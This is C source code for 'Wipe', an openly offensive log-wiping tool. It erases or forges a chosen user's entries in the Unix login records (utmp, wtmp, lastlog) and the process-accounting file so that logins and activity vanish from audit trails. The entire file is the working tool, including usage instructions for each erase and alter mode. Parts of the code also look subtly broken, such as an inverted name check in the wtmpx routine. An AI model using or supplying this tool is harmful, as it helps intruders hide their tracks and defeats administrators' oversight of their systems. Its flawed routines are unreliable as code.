/*
 * Wipe v1.01.
 *
 * Written by The Crawler.
 *
 * Selectively wipe system logs.
 *
 * Wipes logs on, but not including, Linux, FreeBSD, Sunos 4.x, Solaris 2.x,
 *      Ultrix, AIX, IRIX, Digital UNIX, BSDI, NetBSD, HP/UX.
 */

#include "feature.h"

#ifdef __FreeBSD__
#define ut_name ut_user
#endif

#define _XOPEN_SOURCE 500

#include <sys/types.h>
#include <sys/stat.h>
#include <sys/uio.h>
#ifndef NO_ACCT
#include <sys/acct.h>
#endif
#include <fcntl.h>
#include <unistd.h>
#include <stdio.h>
#include <ctype.h>
#include <string.h>
#include <pwd.h>
#include <time.h>
#include <stdlib.h>

#ifdef HAVE_SOLARIS
#include <strings.h>
#define HAVE_LASTLOG_H
#endif

#ifdef HAVE_LASTLOG_H
#include <lastlog.h>
#endif

#ifdef HAVE_UTMP
#include <utmp.h>
#endif

#ifdef HAVE_UTMPX
#include <utmpx.h>
#endif

/*
 * Try to use the paths out of the include files.
 * But if we can't find any, revert to the defaults.
 */
#ifndef UTMP_FILE
#ifdef _PATH_UTMP
#define UTMP_FILE	_PATH_UTMP
#else
#define UTMP_FILE	"/var/adm/utmp"
#endif
#endif

#ifndef WTMP_FILE
#ifdef _PATH_WTMP
#define WTMP_FILE	_PATH_WTMP
#else
#define WTMP_FILE	"/var/adm/wtmp"
#endif
#endif

#ifndef LASTLOG_FILE
#ifdef _PATH_LASTLOG
#define LASTLOG_FILE	_PATH_LASTLOG
#else
#define LASTLOG_FILE	"/var/adm/lastlog"
#endif
#endif

#ifndef ACCT_FILE
#define ACCT_FILE	"/var/adm/pacct"
#endif

#ifdef HAVE_UTMPX

#ifndef UTMPX_FILE
#define UTMPX_FILE	"/var/adm/utmpx"
#endif

#ifndef WTMPX_FILE
#define WTMPX_FILE	"/var/adm/wtmpx"
#endif

#endif /* HAVE_UTMPX */

#define BUFFSIZE	8192

char *arg0;

inline char *basename(char *path) {
	char *p = strrchr(path, '/');
	return p ? p : path;
}

inline void bzero(void *s, size_t n) {
	memset(s, 0, n);
}

/*
 * This function will copy the src file to the dst file.
 */
void
copy_file(char *src, char *dst)
{
	int 	fd1, fd2;
	int	n;
	char	buf[BUFFSIZE];

	if ((fd1 = open(src, O_RDONLY)) < 0) {
		fprintf(stderr, "fatal: could not open %s for copy: %m\n", src);
		return;
	}

	if ((fd2 = open(dst, O_WRONLY|O_CREAT|O_TRUNC, 0644)) < 0) {
		fprintf(stderr, "fatal: could not open %s for copy: %m\n", dst);
		return;
	}

	while ((n = read(fd1, buf, BUFFSIZE)) > 0) {
		if (write(fd2, buf, n) != n) {
			fprintf(stderr, "fatal: write error during copy: %m\n");
			return;
		}
	}

	if (n < 0) {
		fprintf(stderr, "fatal: read error during copy: %m\n");
		return;
	}

	close(fd1);
	close(fd2);
}


/*
 * UTMP editing.
 */
#ifdef HAVE_UTMP
void
wipe_utmp(char *who, char *line)
{
	int 		fd1;
	struct utmp	ut;

	printf("Patching %s .... ", UTMP_FILE);
	fflush(stdout);

	/*
	 * Open the utmp file.
	 */
	if ((fd1 = open(UTMP_FILE, O_RDWR)) < 0) {
		fprintf(stderr, "fatal: could not open %s: %m\n", UTMP_FILE);
		return;
	}

	/*
	 * Copy utmp file excluding relevent entries.
	 */
	while (read(fd1, &ut, sizeof(ut)) > 0) {
		if (strncmp(ut.ut_name, who, strlen(who)) != 0)
			continue;
		if (line && strncmp(ut.ut_line, line, strlen(line)) != 0)
			continue;
		bzero((char *) &ut, sizeof(ut));
		lseek(fd1, (int) -sizeof(ut), SEEK_CUR);
		write(fd1, &ut, sizeof(ut));
	}

	close(fd1);

	printf("Done.\n");
}
#endif

/*
 * UTMPX editing if supported.
 */
#ifdef HAVE_UTMPX
void
wipe_utmpx(char *who, char *line)
{
	int 		fd1;
	struct utmpx	utx;

	printf("Patching %s .... ", UTMPX_FILE);
	fflush(stdout);

	/*
	 * Open the utmp file and temporary file.
	 */
	if ((fd1 = open(UTMPX_FILE, O_RDWR)) < 0) {
		fprintf(stderr, "fatal: could not open %s: %m\n", UTMPX_FILE);
		return;
	}

	while (read(fd1, &utx, sizeof(utx)) > 0) {
		if (strncmp(utx.ut_name, who, strlen(who)) != 0)
			continue;
		if (line && strncmp(utx.ut_line, line, strlen(line)) != 0)
			continue;
		bzero((char *) &utx, sizeof(utx));
		lseek(fd1, (int) -sizeof(utx), SEEK_CUR);
		write(fd1, &utx, sizeof(utx));
	}

	close(fd1);

	printf("Done.\n");
}
#endif


/*
 * WTMP editing.
 */
#ifdef HAVE_UTMP
void
wipe_wtmp(char *who, char *line)
{
	int		fd1;
	struct utmp	ut;

	printf("Patching %s .... ", WTMP_FILE);
	fflush(stdout);

	/*
	 * Open the wtmp file and temporary file.
	 */
	if ((fd1 = open(WTMP_FILE, O_RDWR)) < 0) {
		fprintf(stderr, "fatal: could not open %s: %m\n", WTMP_FILE);
		return;
	}

	/*
	 * Determine offset of last relevent entry.
	 */
	lseek(fd1, (long) -(sizeof(ut)), SEEK_END);
	while ((read (fd1, &ut, sizeof(ut))) > 0) {
		if (strncmp(ut.ut_name, who, strlen(who)) != 0)
			goto skip;
		if (line && strncmp(ut.ut_line, line, strlen(line)) != 0)
			goto skip;
		bzero((char *) &ut, sizeof(ut));
		lseek(fd1, (long) -(sizeof(ut)), SEEK_CUR);
		write(fd1, &ut, sizeof(ut));
		break;
skip:
		lseek(fd1, (long) -(sizeof(ut) * 2), SEEK_CUR);
	}

	close(fd1);

	printf("Done.\n");
}
#endif


/*
 * WTMPX editing if supported.
 */
#ifdef HAVE_UTMPX
void
wipe_wtmpx(char *who, char *line)
{
	int 		fd1;
	struct utmpx	utx;

	printf("Patching %s .... ", WTMPX_FILE);
	fflush(stdout);

	/*
	 * Open the utmp file and temporary file.
	 */
	if ((fd1 = open(WTMPX_FILE, O_RDWR)) < 0) {
		fprintf(stderr, "fatal: could not open %s: %m\n", WTMPX_FILE);
		return;
	}

	/*
	 * Determine offset of last relevent entry.
	 */
	lseek(fd1, (long) -(sizeof(utx)), SEEK_END);
	while ((read(fd1, &utx, sizeof(utx))) > 0) {
		if (!strncmp(utx.ut_name, who, strlen(who)))
			goto skip;
		if (line && strncmp(utx.ut_line, line, strlen(line)) != 0)
			goto skip;
		bzero((char *) &utx, sizeof(utx));
		lseek(fd1, (long) -(sizeof(utx)), SEEK_CUR);
		write(fd1, &utx, sizeof(utx));
		break;
skip:
		lseek(fd1, (int) -(sizeof(utx) * 2), SEEK_CUR);
	}

	close(fd1);

	printf("Done.\n");
}
#endif


/*
 * LASTLOG editing.
 */
#ifdef HAVE_LASTLOG
void
wipe_lastlog(char *who, char *line, char *timestr, char *host)
{
	int		fd1;
	struct lastlog	ll;
	struct passwd	*pwd;
	struct tm	tm;

	printf("Patching %s .... ", LASTLOG_FILE);
	fflush(stdout);

        /*
	 * Open the lastlog file.
	 */
	if ((fd1 = open(LASTLOG_FILE, O_RDWR)) < 0) {
		fprintf(stderr, "fatal: could not open %s: %m\n", LASTLOG_FILE);
		return;
	}

	if ((pwd = getpwnam(who)) == NULL) {
		fprintf(stderr, "fatal: could not find user '%s'\n", who);
		return;
	}

	lseek(fd1, (long) pwd->pw_uid * sizeof(struct lastlog), 0);
	bzero((char *) &ll, sizeof(ll));

	if (line)
		strncpy(ll.ll_line, line, strlen(line));

	if (timestr) {
		char *r = strptime(timestr, "%Y%m%d%H%M", &tm);
		if (!r) {
			fprintf(stderr, "fatal: failed to parse datetime\n");
			return;
		} else if (*r) {
			fprintf(stderr, "fatal: garbage after datetime: '%s'\n", r);
			return;
		}
		ll.ll_time = mktime(&tm);
	}

	if (host)
		strncpy(ll.ll_host, host, sizeof(ll.ll_host));

	write(fd1, (char *) &ll, sizeof(ll));

	close(fd1);

	printf("Done.\n");
}
#endif


#ifndef NO_ACCT
/*
 * ACCOUNT editing.
 */
void
wipe_acct(char *who, char *line)
{
	int		fd1, fd2;
	struct acct	ac;
	char		ttyn[50];
	struct passwd   *pwd;
	struct stat	sbuf;
	char		*tmpf = "/tmp/acct_XXXXXX";

	printf("Patching %s ... ", ACCT_FILE);
	fflush(stdout);

        /*
	 * Open the acct file and temporary file.
	 */
	if ((fd1 = open(ACCT_FILE, O_RDONLY)) < 0) {
		fprintf(stderr, "fatal: could not open %s: %m\n", ACCT_FILE);
		return;
	}

	/*
	 * Grab a unique temporary filename.
	 */
	if ((fd2 = mkstemp(tmpf)) < 0) {
		fprintf(stderr, "fatal: could not open temporary file: %m\n");
		return;
	}

	if ((pwd = getpwnam(who)) == NULL) {
		fprintf(stderr, "fatal: could not find user '%s'\n", who);
		return;
	}

	/*
	 * Determine tty's device number
	 */
	strcpy(ttyn, "/dev/");
	strcat(ttyn, line);
	if (stat(ttyn, &sbuf) < 0) {
		fprintf(stderr, "fatal: could not determine device number for tty: %m\n");
		return;
	}

	while (read(fd1, &ac, sizeof(ac)) > 0) {
		if (!(ac.ac_uid == pwd->pw_uid && ac.ac_tty == sbuf.st_rdev))
			write(fd2, &ac, sizeof(ac));
	}

	close(fd1);
	close(fd2);

	copy_file(tmpf, ACCT_FILE);

	if ( unlink(tmpf) < 0 ) {
		fprintf(stderr, "fatal: could not unlink temp file: %m\n");
		return;
	}

	printf("Done.\n");
}
#endif


void
usage()
{
	printf("USAGE: %s [ u|w|l|a ] ...options...\n", arg0);
	printf("\n");
#ifdef HAVE_UTMPX
	printf("UTMPX editing (%s, %s)\n", UTMP_FILE, UTMPX_FILE);
#else
	printf("UTMP editing (%s)\n", UTMP_FILE);
#endif
	printf("    Erase all usernames      :   %s u [username]\n", arg0);
	printf("    Erase one username on tty:   %s u [username] [tty]\n", arg0);
	printf("\n");
	printf("WTMP editing (%s)\n", WTMP_FILE);
	printf("   Erase last entry for user :   %s w [username]\n", arg0);
	printf("   Erase last entry on tty   :   %s w [username] [tty]\n", arg0);
	printf("\n");
	printf("LASTLOG editing (%s)\n", LASTLOG_FILE);
	printf("   Blank lastlog for user    :   %s l [username]\n", arg0);
	printf("   Alter lastlog entry       :   %s l [username] [tty] [time] [host]\n", arg0);
	printf("	Where [time] is in the format [YYYYMMddhhmm]\n");
	printf("\n");
#ifndef NO_ACCT
	printf("ACCT editing (%s)\n", ACCT_FILE);
	printf("   Erase acct entries on tty :   %s a [username] [tty]\n", arg0);
#endif
	exit(0);
}

int
main(int argc, char *argv[])
{
	char	c;

	arg0 = basename(argv[0]);

	if (argc < 3)
		usage();

	/*
	 * First character of first argument determines which file to edit.
	 */
	c = toupper(argv[1][0]);

	/*
	 * UTMP editing.
	 */
	switch (c) {
		/* UTMP */
		case 'U' :
#ifdef HAVE_UTMP
			if (argc == 3)
				wipe_utmp(argv[2], (char *) NULL);
			if (argc == 4)
				wipe_utmp(argv[2], argv[3]);
#endif
#ifdef HAVE_UTMPX
			if (argc == 3)
				wipe_utmpx(argv[2], (char *) NULL);
			if (argc == 4)
				wipe_utmpx(argv[2], argv[3]);
#endif
			break;
		/* WTMP */
		case 'W' :
#ifdef HAVE_UTMP
			if (argc == 3)
				wipe_wtmp(argv[2], (char *) NULL);
			if (argc == 4)
				wipe_wtmp(argv[2], argv[3]);
#endif
#ifdef HAVE_UTMPX
			if (argc == 3)
				wipe_wtmpx(argv[2], (char *) NULL);
			if (argc == 4)
				wipe_wtmpx(argv[2], argv[3]);
#endif
			break;
#ifdef HAVE_LASTLOG
		/* LASTLOG */
		case 'L' :
			if (argc == 3)
				wipe_lastlog(argv[2], (char *) NULL,
					(char *) NULL, (char *) NULL);
			if (argc == 4)
				wipe_lastlog(argv[2], argv[3], (char *) NULL,
						(char *) NULL);
			if (argc == 5)
				wipe_lastlog(argv[2], argv[3], argv[4],
						(char *) NULL);
			if (argc == 6)
				wipe_lastlog(argv[2], argv[3], argv[4],
						argv[5]);
			break;
#endif
#ifndef NO_ACCT
		/* ACCT */
		case 'A' :
			if (argc != 4)
				usage();
			wipe_acct(argv[2], argv[3]);
			break;
#endif
	}

	return 0;
}

